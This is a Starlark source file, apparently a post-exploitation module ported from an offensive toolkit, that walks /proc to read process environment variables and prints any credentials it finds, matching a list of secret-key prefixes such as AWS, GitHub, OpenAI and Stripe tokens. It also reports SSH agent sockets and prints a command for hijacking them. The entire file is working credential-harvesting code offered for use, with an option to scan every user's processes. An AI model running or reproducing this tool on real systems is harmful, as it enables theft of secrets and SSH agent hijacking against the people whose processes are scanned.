# linux_env_scrape - harvest secrets and SSH agent sockets from /proc/<pid>/environ.
#
# Ported to Starlark from Furtex's edrs/env_scrape.c.
# Upstream project: https://github.com/MatheuZSecurity/Furtex (MIT License,
# Copyright (c) 2026 MatheuZ). See README.md in this directory for attribution.

# Environment keys that usually carry credentials. Prefix match, like upstream.
SECRET_KEYS = [
    "PASSWORD", "PASSWD", "SECRET", "TOKEN", "API_KEY", "APIKEY",
    "ACCESS_KEY", "PRIVATE_KEY", "PRIVATE", "CREDENTIAL", "AUTH",
    "AWS_SECRET", "AWS_ACCESS", "GITHUB_TOKEN", "GH_TOKEN",
    "DATABASE_URL", "DB_PASS", "REDIS_URL", "MONGO_URL",
    "OPENAI_", "ANTHROPIC_", "STRIPE_", "TWILIO_", "SENDGRID_",
    "SLACK_TOKEN", "DISCORD_TOKEN", "TELEGRAM_",
    "KUBECONFIG", "GOOGLE_APPLICATION", "AZURE_",
]

SSH_KEY = "SSH_AUTH_SOCK"


def _is_pid(name):
    if not name:
        return False
    c = name[0]
    return c >= "0" and c <= "9"


def _is_secret(key):
    up = str_upper(key)
    for m in SECRET_KEYS:
        if str_startswith(up, m):
            return True
    return False


def _proc_uid(pid):
    status = read_file(sprintf("/proc/%s/status", pid), default="")
    for line in status.splitlines():
        if str_startswith(line, "Uid:"):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return ""


def _scan_pid(pid, mode, ssh_only):
    environ = read_file(sprintf("/proc/%s/environ", pid), default="")
    if not environ:
        return 0
    comm = read_file(sprintf("/proc/%s/comm", pid), default="").strip()
    uid = _proc_uid(pid)
    printed = 0
    for entry in environ.split("\x00"):
        if not entry:
            continue
        idx = str_index(entry, "=")
        if idx < 1:
            continue
        key = entry[:idx]
        is_ssh = (key == SSH_KEY)
        secret = _is_secret(key)
        show = is_ssh if ssh_only else (secret if mode == "secrets" else True)
        if not show:
            continue
        if printed == 0:
            print("")
            print(sprintf("[pid=%-6s uid=%-6s comm=%s]", pid, uid or "?", comm))
        if secret:
            print(sprintf("  [SECRET] %s", entry))
        else:
            print(sprintf("  %s", entry))
        if is_ssh:
            print(sprintf("  [>>] export SSH_AUTH_SOCK=%s && ssh-add -l", entry[idx + 1:]))
        printed += 1
    return printed


def main(*args):
    mode = "secrets"
    scope = "own"
    if args and args[0]:
        mode = str_lower(args[0].strip())
    if len(args) > 1 and args[1]:
        scope = str_lower(args[1].strip())
    if mode not in ("secrets", "ssh", "all"):
        mode = "secrets"
    if scope not in ("own", "all"):
        scope = "own"

    ssh_only = (mode == "ssh")
    my_uid = "?"
    uid_res = sys_call("getuid")
    if uid_res["errno"] == 0:
        my_uid = sprintf("%d", uid_res["r1"])
    print(sprintf("[*] env scrape uid=%s mode=%s scope=%s", my_uid, mode, scope))

    scanned = 0
    for pid in list_dir("/proc"):
        if not _is_pid(pid):
            continue
        if scope == "own":
            if _proc_uid(pid) != my_uid:
                continue
        _scan_pid(pid, mode, ssh_only)
        scanned += 1

    print("")
    print(sprintf("[*] %d processes scanned", scanned))
    return "OK"
